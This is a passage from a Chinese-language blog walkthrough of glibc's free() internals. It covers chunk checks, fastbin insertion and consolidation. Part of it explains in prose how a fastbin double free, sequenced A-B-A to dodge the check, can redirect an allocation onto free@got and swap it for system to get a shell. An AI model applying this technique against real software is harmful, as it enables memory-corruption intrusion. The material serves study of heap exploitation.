class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MALLOC_ALIGNMENT       (2 *SIZE_SZ)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MALLOC_ALIGN_MASK      (MALLOC_ALIGNMENT - 1)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> misaligned_chunk(p) \</span></span><br><span class="line"><span class="meta">  ((uintptr_t)(MALLOC_ALIGNMENT == 2 * SIZE_SZ ? (p) : chunk2mem (p)) \</span></span><br><span class="line"><span class="meta">   &amp; MALLOC_ALIGN_MASK)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SIZE_BITS (PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)</span></span><br><span class="line"><span class="comment">/* Get size, ignoring use bits */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> chunksize(p)         ((p)-&gt;size &amp; ~(SIZE_BITS))</span></span><br><span class="line">INTERNAL_SIZE_T size;        <span class="comment">/* its size */</span></span><br><span class="line">mfastbinptr *fb;             <span class="comment">/* associated fastbin */</span></span><br><span class="line">mchunkptr nextchunk;         <span class="comment">/* next contiguous chunk */</span></span><br><span class="line">INTERNAL_SIZE_T nextsize;    <span class="comment">/* its size */</span></span><br><span class="line"><span class="keyword">int</span> nextinuse;               <span class="comment">/* true if nextchunk is used */</span></span><br><span class="line">INTERNAL_SIZE_T prevsize;    <span class="comment">/* size of previous contiguous chunk */</span></span><br><span class="line">mchunkptr bck;               <span class="comment">/* misc temp for linking */</span></span><br><span class="line">mchunkptr fwd;               <span class="comment">/* misc temp for linking */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">char</span> *errstr = <span class="literal">NULL</span>;</span><br><span class="line"><span class="keyword">int</span> locked = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">size = chunksize (p);</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Little security check which won&#x27;t hurt performance: the</span></span><br><span class="line"><span class="comment">     allocator never wrapps around at the end of the address space.</span></span><br><span class="line"><span class="comment">     Therefore we can exclude some size values which might appear</span></span><br><span class="line"><span class="comment">     here by accident or by &quot;design&quot; from some intruder.  */</span></span><br><span class="line"><span class="keyword">if</span> (__builtin_expect ((<span class="keyword">uintptr_t</span>) p &gt; (<span class="keyword">uintptr_t</span>) -size, <span class="number">0</span>)</span><br><span class="line">    || __builtin_expect (misaligned_chunk (p), <span class="number">0</span>))</span><br><span class="line">&#123;</span><br><span class="line">    errstr = <span class="string">&quot;free(): invalid pointer&quot;</span>;</span><br><span class="line">    errout:</span><br><span class="line">    <span class="keyword">if</span> (!have_lock &amp;&amp; locked)</span><br><span class="line">        (<span class="keyword">void</span>) mutex_unlock (&amp;av-&gt;mutex);</span><br><span class="line">    malloc_printerr (check_action, errstr, chunk2mem (p), av);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;    </span><br></pre></td></tr></table></figure><p>首先变量定义是差不多的，然后这里进行了一项<code>check</code>。</p><ol><li><code>(uintptr_t) p &gt; (uintptr_t) -size</code>：这里让我有点费解，指针和size进行比较。通常情况下size取负之后会变得很大，比如<code>0xfff...</code>这样的大数值通常指针不会指向这样的地址，f开头的一般都是内核地址。所以<code>p&gt;0xfff....</code>主要是应该要检测被<code>free</code>的<code>chunk</code>的<code>size</code>不要过大。</li><li><code>misaligned_chunk (p)</code>：这里的话主要是这个<code>chunk</code>的指针与上掩码，掩码就是<code>0x10-1</code>也就是<code>0xf</code>，取出后四位观察是否为0，如果不为0则说明指针错误了，机会在这里报错。这里主要是检查对齐，指针需要指到<code>0x10</code>的整倍数的<code>chunk</code>才能被正常<code>free</code>，就是不知道<code>malloc</code>为什么不开这个检测，开了又有一大批利用手段用不了了(狗头。</li></ol><p><code>check</code>不通过就会用<code>malloc_printerr</code>打印错误信息，然后处理锁上的一些内容。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> aligned_OK(m)  (((unsigned long)(m) &amp; MALLOC_ALIGN_MASK) == 0)</span></span><br><span class="line"><span class="comment">/* We know that each chunk is at least MINSIZE bytes in size or a</span></span><br><span class="line"><span class="comment">     multiple of MALLOC_ALIGNMENT.  */</span></span><br><span class="line"><span class="keyword">if</span> (__glibc_unlikely (size &lt; MINSIZE || !aligned_OK (size)))</span><br><span class="line">&#123;</span><br><span class="line">    errstr = <span class="string">&quot;free(): invalid size&quot;</span>;</span><br><span class="line">    <span class="keyword">goto</span> errout;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">check_inuse_chunk(av, p);</span><br></pre></td></tr></table></figure><p>又有一个<code>check</code></p><ol><li><code>size &lt; MINSIZE</code>：如果<code>size</code>还比<code>MINSIZE</code>要小，那肯定<code>size</code>肯定出错了。</li><li><code>!aligned_OK (size)</code>：<code>chunk size</code>也要对齐，但是这个<code>check</code>一般不会被触发，因为再取出<code>chunk size</code>的时候就会把最低位与掉。</li></ol><p>然后它这里需要<code>check</code>一下这个<code>free</code>的<code>chunk</code>是正在使用的，怎么<code>check</code>呢，那就肯定是下一个<code>chunk</code>的<code>prev_inuse</code>位为0啦，具体的实现函数是这样的。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> next_chunk(p) ((mchunkptr) (((char *) (p)) + ((p)-&gt;size &amp; ~SIZE_BITS)))</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span></span></span><br><span class="line"><span class="function"><span class="title">do_check_inuse_chunk</span> <span class="params">(mstate av, mchunkptr p)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  mchunkptr next;</span><br><span class="line"></span><br><span class="line">  do_check_chunk (av, p);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (chunk_is_mmapped (p))</span><br><span class="line">    <span class="keyword">return</span>; <span class="comment">/* mmapped chunks have no next/prev */</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Check whether it claims to be in use ... */</span></span><br><span class="line">  assert (inuse (p));</span><br><span class="line"></span><br><span class="line">  next = next_chunk (p);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* ... and is surrounded by OK chunks.</span></span><br><span class="line"><span class="comment">     Since more things can be checked with free chunks than inuse ones,</span></span><br><span class="line"><span class="comment">     if an inuse chunk borders them and debug is on, it&#x27;s worth doing them.</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line">  <span class="keyword">if</span> (!prev_inuse (p))</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/* Note that we cannot even look at prev unless it is not inuse */</span></span><br><span class="line">      mchunkptr prv = prev_chunk (p);</span><br><span class="line">      assert (next_chunk (prv) == p);</span><br><span class="line">      do_check_free_chunk (av, prv);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (next == av-&gt;top)</span><br><span class="line">    &#123;</span><br><span class="line">      assert (prev_inuse (next));</span><br><span class="line">      assert (chunksize (next) &gt;= MINSIZE);</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> (!inuse (next))</span><br><span class="line">    do_check_free_chunk (av, next);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>多的也不说了，相信都能理解的，根据自身指针和自身大小就可以很容易知道下一个<code>chunk</code>的位置，然后检测一下<code>prev_inuse</code>位判断我当前<code>chunk</code>是否被使用。</p><h3 id="fast-bin范围的处理"><a href="#fast-bin范围的处理" class="headerlink" title="fast bin范围的处理"></a>fast bin范围的处理</h3><h4 id="fast-bin的check"><a href="#fast-bin的check" class="headerlink" title="fast bin的check"></a>fast bin的check</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>)(size) &lt;= (<span class="keyword">unsigned</span> <span class="keyword">long</span>)(get_max_fast ())</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> TRIM_FASTBINS</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">If TRIM_FASTBINS set, don&#x27;t place chunks</span></span><br><span class="line"><span class="comment">bordering top into fastbins</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">&amp;&amp; (chunk_at_offset(p, size) != av-&gt;top)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">) </span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (__builtin_expect (chunk_at_offset (p, size)-&gt;size &lt;= <span class="number">2</span> * SIZE_SZ, <span class="number">0</span>)</span><br><span class="line">    || __builtin_expect (chunksize (chunk_at_offset (p, size))</span><br><span class="line">    &gt;= av-&gt;system_mem, <span class="number">0</span>))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">/* We might not have a lock at this point and concurrent modifications</span></span><br><span class="line"><span class="comment">        of system_mem might have let to a false positive.  Redo the test</span></span><br><span class="line"><span class="comment">        after getting the lock.  */</span></span><br><span class="line">        <span class="keyword">if</span> (have_lock</span><br><span class="line">        || (&#123; assert (locked == <span class="number">0</span>);</span><br><span class="line">        mutex_lock(&amp;av-&gt;mutex);</span><br><span class="line">        locked = <span class="number">1</span>;</span><br><span class="line">        chunk_at_offset (p, size)-&gt;size &lt;= <span class="number">2</span> * SIZE_SZ</span><br><span class="line">        || chunksize (chunk_at_offset (p, size)) &gt;= av-&gt;system_mem;</span><br><span class="line">        &#125;))</span><br><span class="line">        &#123;</span><br><span class="line">            errstr = <span class="string">&quot;free(): invalid next size (fast)&quot;</span>;</span><br><span class="line">            <span class="keyword">goto</span> errout;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (! have_lock)</span><br><span class="line">        &#123;</span><br><span class="line">            (<span class="keyword">void</span>)mutex_unlock(&amp;av-&gt;mutex);</span><br><span class="line">            locked = <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    ........</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个大条件很明显就是判断这个<code>free</code>的<code>chunk</code>是否为<code>fast bin</code>，后面又判断且这个<code>chunk</code>的后一个<code>chunk</code>不为<code>top_chunk</code>，虽然根据自己的经验好像判断后一个不为<code>top_chunk</code>没什么意义。</p><p>然后满足的话就是一个<code>check</code>，判断<code>size</code>是否小于<code>MINSIZE</code>或者是<code>size&gt;=system_mem</code>。就是排除一些不合理的情况然后会重新尝试拿分配器的锁然后再做一个判断，如果刚刚那个条件还是成立的话那就说明<code>size</code>真的被改成了非法数值，那就报错退出。</p><p>如果进来了但是没有执行报错呢，说明可能多线程有点问题，就释放这个<code>arena</code>的锁，这里我多线程不是很好也不知道该如何解释，但是这个应该不是主要分析的，咱们平时做题基本也不会遇到多线程编程的题目。</p><h4 id="free-fast-bin"><a href="#free-fast-bin" class="headerlink" title="free fast bin"></a>free fast bin</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> FASTCHUNKS_BIT        (1U)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> set_fastchunks(M)      catomic_and (&amp;(M)-&gt;flags, ~FASTCHUNKS_BIT)</span></span><br><span class="line"><span class="keyword">if</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>)(size) &lt;= (<span class="keyword">unsigned</span> <span class="keyword">long</span>)(get_max_fast ())</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> TRIM_FASTBINS</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">If TRIM_FASTBINS set, don&#x27;t place chunks</span></span><br><span class="line"><span class="comment">bordering top into fastbins</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">&amp;&amp; (chunk_at_offset(p, size) != av-&gt;top)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">) </span><br><span class="line">&#123;</span><br><span class="line">    ......</span><br><span class="line">    free_perturb (chunk2mem(p), size - <span class="number">2</span> * SIZE_SZ);</span><br><span class="line"></span><br><span class="line">    set_fastchunks(av);</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> idx = fastbin_index(size);</span><br><span class="line">    fb = &amp;fastbin (av, idx);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Atomically link P to its fastbin: P-&gt;FD = *FB; *FB = P;  */</span></span><br><span class="line">    mchunkptr old = *fb, old2;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> old_idx = ~<span class="number">0u</span>;</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">/* Check that the top of the bin is not the record we are going to add</span></span><br><span class="line"><span class="comment">        (i.e., double free).  */</span></span><br><span class="line">        <span class="keyword">if</span> (__builtin_expect (old == p, <span class="number">0</span>))</span><br><span class="line">        &#123;</span><br><span class="line">            errstr = <span class="string">&quot;double free or corruption (fasttop)&quot;</span>;</span><br><span class="line">            <span class="keyword">goto</span> errout;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">/* Check that size of fastbin chunk at the top is the same as</span></span><br><span class="line"><span class="comment">        size of the chunk that we are adding.  We can dereference OLD</span></span><br><span class="line"><span class="comment">        only if we have the lock, otherwise it might have already been</span></span><br><span class="line"><span class="comment">        deallocated.  See use of OLD_IDX below for the actual check.  */</span></span><br><span class="line">        <span class="keyword">if</span> (have_lock &amp;&amp; old != <span class="literal">NULL</span>)</span><br><span class="line">            old_idx = fastbin_index(chunksize(old));</span><br><span class="line">        p-&gt;fd = old2 = old;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> ((old = catomic_compare_and_exchange_val_rel (fb, p, old2)) != old2);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (have_lock &amp;&amp; old != <span class="literal">NULL</span> &amp;&amp; __builtin_expect (old_idx != idx, <span class="number">0</span>))</span><br><span class="line">    &#123;</span><br><span class="line">        errstr = <span class="string">&quot;invalid fastbin entry (free)&quot;</span>;</span><br><span class="line">        <span class="keyword">goto</span> errout;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>它先执行了一个<code>free_perturb</code>函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//free_perturb</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span></span></span><br><span class="line"><span class="function"><span class="title">free_perturb</span> <span class="params">(<span class="keyword">char</span> *p, <span class="keyword">size_t</span> n)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely (perturb_byte))</span><br><span class="line">    <span class="built_in">memset</span> (p, perturb_byte, n);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其实跟前面<code>malloc</code>那个函数差不多，就是看你有没有设置那个值，如果设置了就在<code>free</code>之前把堆块进行<code>memset</code>清空，但是不一样的是，<code>perturb</code>中<code>memset</code>第二个参数是要根据你设置的值再异或一个<code>0xff</code>的。</p><p>然后是用<code>set_fastchunks(av)</code>宏定义去初始化<code>fast bin</code>。之后根据<code>size</code>算出下标找到对应的<code>fast bin</code>，之后就应该把这个<code>free</code>的<code>chunk</code>链入<code>fast bin</code>里面。这里还有一个<code>check</code>，如果<code>bin</code>顶部的那个<code>chunk</code>和这次要<code>free</code>的<code>chunk</code>相等的话，就报错退出，这也就是我们熟知的<code>double free</code>漏洞了。那么说到<code>double free</code>我们来看看<code>double free</code>能造成什么后果。</p><p>假如我要<code>free</code>的<code>chunk</code>是A，我第一次<code>free</code> A，<code>bin</code>为空，链入其中，<code>fast bin</code>中多了一个A。第二次<code>free</code> A，A再次被加入<code>fast bin</code>中，然后会导致产生一个自己指向自己的指针。<code>fast bin</code>中的情况就是两个A，<code>A-&gt;A</code>。此时我申请一个和A一样大的<code>chunk</code>，A被申请走，<code>fast bin</code>中还剩下一个A，但是此时用户手里有一个A，<code>fast bin</code>中也有一个A。用户可以直接编辑A的指针域，比如我让它指向了<code>got</code>表中的<code>free</code>函数。那么此时<code>fast bin</code>中的情况就是<code>A-&gt;free@got</code>。然后我再次申请和A一样大小的<code>chunk</code>，A被取出来，<code>fast bin</code>中剩下<code>free@got</code>。那么我第三次申请就得到了在<code>free@got</code>那边的<code>chunk</code>，然后假如我偷偷修改一下<code>free@got</code>为<code>system</code>，那就能轻松<code>get shell</code>了。这里可以看到，<code>free@got</code>这个指针我是能任意编辑的，也就是说我想申请到哪都不是问题，这样我就能任意地址写了。</p><p>你可能有点疑问，我<code>free</code>了2个堆块，怎么出来3个堆块。那我们想想，如果遍历一个单链表，你怎么判断结尾？咱们一般都是判断<code>x-&gt;next!=NULL</code>但是原来那边A的<code>next</code>指针确实是<code>NULL</code>，但是你把指针改过了，就会认为<code>fast bin</code>还没有空。</p><p>但是实际情况往往没有那么简单，前面我们说过了，<code>malloc</code>取出一个<code>fast bin</code>的<code>chunk</code>的时候，会判断它<code>chunk</code>的<code>size</code>是否等于当前我要申请的<code>size</code>，如果不是就会报错退出。所以<code>double free</code>在利用的时候还是没那么”任意”的，而且这里也不允许你直接<code>double free</code>，但是直接不能不代表不能间接<code>double free</code>，如果我先<code>free</code>一个A，<code>free</code>一个B之后再<code>free</code>一个A，那么我再申请到A的时候修改A的指针域一样可以劫持，并且可以绕过这里的检测。</p><p>然后如果过了检测，那就将这个<code>chunk</code>假如<code>fast bin</code>的顶部。这里就是一个单链表的插入，具体自己写的话应该是这样</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">p-&gt;fd=av-&gt;fastbinY[index]-&gt;fd;</span><br><span class="line">av-&gt;fastbinY[index]-&gt;fd=p;</span><br></pre></td></tr></table></figure><p>源码中与这个略微有点不一样，效果是一样的。所以也可以看出来这个是后进先出，只在<code>fast bin</code>的一端插入删除，跟栈差不多。</p><p>末尾还有一个<code>check</code>，但是这个<code>check</code>通常不会被触发，有会的师傅也请帮帮，因为是真的不知道hhh。</p><h4 id="free非fast-bin"><a href="#free非fast-bin" class="headerlink" title="free非fast bin"></a>free非fast bin</h4><p>这里分了两种情况，如果<code>chunk</code>是<code>mmap</code>分配的话那就调用<code>munmap_chunk</code>函数去<code>free</code>这个<code>chunk</code>，这个情况不属于我们主要要分析的内容，所以那边的else分支我们跳过，只分析非<code>mmap</code>分配的<code>chunk</code>。</p><h4 id="第一部分：锁"><a href="#第一部分：锁" class="headerlink" title="第一部分：锁"></a>第一部分：锁</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (! have_lock) &#123;</span><br><span class="line">    (<span class="keyword">void</span>)mutex_lock(&amp;av-&gt;mutex);</span><br><span class="line">    locked = <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line">......</span><br><span class="line"><span class="keyword">if</span> (! have_lock) &#123;</span><br><span class="line">    assert (locked);</span><br><span class="line">    (<span class="keyword">void</span>)mutex_unlock(&amp;av-&gt;mutex);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这我熟，就是在用一个分配器的时候先加锁，用完了释放就行了。这主要是为了防止多个线程之间发生竞争，虽然我看过多线程是说有独立的堆空间，但是假设堆块正常使用，正常分配，不去做指针的越界操作，那么同一个分配器分配给不同的线程用也是完全可行的，我只拿到我自己用的指针在合法范围内用一样不会造成竞争的现象。以上出于我自己的大胆推测，如有不对还请指正。</p><h4 id="第二部分：free之前的各种check"><a href="#第二部分：free之前的各种check" class="headerlink" title="第二部分：free之前的各种check"></a>第二部分：free之前的各种check</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NONCONTIGUOUS_BIT     (2U)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> contiguous(M)          (((M)-&gt;flags &amp; NONCONTIGUOUS_BIT) == 0)</span></span><br><span class="line"></span><br><span class="line">nextchunk = chunk_at_offset(p, size);</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Lightweight tests: check whether the block is already the</span></span><br><span class="line"><span class="comment">       top block.  */</span></span><br><span class="line"><span class="keyword">if</span> (__glibc_unlikely (p == av-&gt;top))</span><br><span class="line">&#123;</span><br><span class="line">    errstr = <span class="string">&quot;double free or corruption (top)&quot;</span>;</span><br><span class="line">    <span class="keyword">goto</span> errout;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/* Or whether the next chunk is beyond the boundaries of the arena.  */</span></span><br><span class="line"><span class="keyword">if</span> (__builtin_expect (contiguous (av)</span><br><span class="line">                      &amp;&amp; (<span class="keyword">char</span> *) nextchunk</span><br><span class="line">                      &gt;= ((<span class="keyword">char</span> *) av-&gt;top + chunksize(av-&gt;top)), <span class="number">0</span>))</span><br><span class="line">&#123;</span><br><span class="line">    errstr = <span class="string">&quot;double free or corruption (out)&quot;</span>;</span><br><span class="line">    <span class="keyword">goto</span> errout;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/* Or whether the block is actually not marked used.  */</span></span><br><span class="line"><span class="keyword">if</span> (__glibc_unlikely (!prev_inuse(nextchunk)))<span class="comment">//后面块的prev in use标志位为0时发生free</span></span><br><span class="line">&#123;</span><br><span class="line">    errstr = <span class="string">&quot;double free or corruption (!prev)&quot;</span>;</span><br><span class="line">    <span class="keyword">goto</span> errout;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">nextsize = chunksize(nextchunk);</span><br><span class="line"><span class="keyword">if</span> (__builtin_expect (nextchunk-&gt;size &lt;= <span class="number">2</span> * SIZE_SZ, <span class="number">0</span>)</span><br><span class="line">    || __builtin_expect (nextsize &gt;= av-&gt;system_mem, <span class="number">0</span>))</span><br><span class="line">&#123;</span><br><span class="line">    errstr = <span class="string">&quot;free(): invalid next size (normal)&quot;</span>;</span><br><span class="line">    <span class="keyword">goto</span> errout;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">free_perturb (chunk2mem(p), size - <span class="number">2</span> * SIZE_SZ);</span><br></pre></td></tr></table></figure><p>好，我们来看第一个<code>check</code>。</p><ol><li><code>p == av-&gt;top</code>：<code>free</code>的<code>chunk</code>为<code>top_chunk</code>。</li></ol><p><code>top_chunk</code>和其它<code>bin</code>一样，都是出于待分配状态，<code>top_chunk</code>永远不会被使用。因为如果切割了<code>top_chunk</code>，<code>top_chunk</code>马上会下移，所以正常分配是绝对不会分配到现在的<code>top_chunk</code>指针的，所以当你尝试<code>free</code> <code>top_chunk</code>的时候，就会报这个错。</p><p>第二个<code>check</code></p><ol><li><code>contiguous (av)</code>：检查分配器上的<code>flags</code>，其实我也不知道是干嘛的(捂脸。</li><li><code>(char *) nextchunk&gt;=(char *) av-&gt;top + chunksize(av-&gt;top)</code>：然后这个条件呢就是说如果我这个<code>chunk</code>的下一个<code>chunk</code>居然在<code>top_chunk</code>之后，那肯定就也有错了。</li></ol><p>第三个<code>check</code></p><ol><li><code>!prev_inuse(nextchunk)</code>：就是说如果后一个<code>chunk</code>的<code>prev_inuse</code>为0，也就是说这个<code>chunk</code>处于被<code>free</code>的状态，那么这一次<code>free</code>就有可能造成<code>double free</code>了，就会报错。</li></ol><p>第四个<code>check</code></p><ol><li><code>nextchunk-&gt;size &lt;= 2 * SIZE_SZ</code>：如果下一个<code>chunk</code>的<code>size</code>有问题一样也要报错退出，这里说的就是下一个<code>chunk</code>的<code>size</code>小于<code>MINSIZE</code>的情况，free的话因为会涉及到chunk的向前合并或者向后合并，因此对前后堆块的检查都很严格。</li><li><code>nextsize &gt;= av-&gt;system_mem</code>：<code>size</code>超出系统分配给分配器的内存，那也报错。</li></ol><h4 id="第三部分：free之后向前合并"><a href="#第三部分：free之后向前合并" class="headerlink" title="第三部分：free之后向前合并"></a>第三部分：free之后向前合并</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* consolidate backward */</span></span><br><span class="line"><span class="keyword">if</span> (!prev_inuse(p)) &#123;</span><br><span class="line">    prevsize = p-&gt;prev_size;</span><br><span class="line">    size += prevsize;</span><br><span class="line">    p = chunk_at_offset(p, -((<span class="keyword">long</span>) prevsize));</span><br><span class="line">    unlink(av, p, bck, fwd);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里就提到了我们之前讲到的一个问题，我一个堆块怎么向前合并，也就是如何准确地找到前一个堆块。向前合并的时候我先判断一下前一个<code>chunk</code>是否被使用，如果不被使用那么就要和前面的<code>chunk</code>合并。这里我就可以通过<code>prev_size</code>位去找到这个堆块，用自身指针减去<code>prev_size</code>就得到了前一个<code>chunk</code>的指针。</p><p>这里需要注意，因为前面那个<code>chunk</code>可能在<code>large bin</code>,<code>small bin</code>或者是<code>unsorted bin</code>的链表当中，那么我就得先把它从这些<code>bin</code>里面解脱出来，也就是<code>unlink</code>操作，合并之后成为一个新的<code>chunk</code>然后再加入<code>unsorted 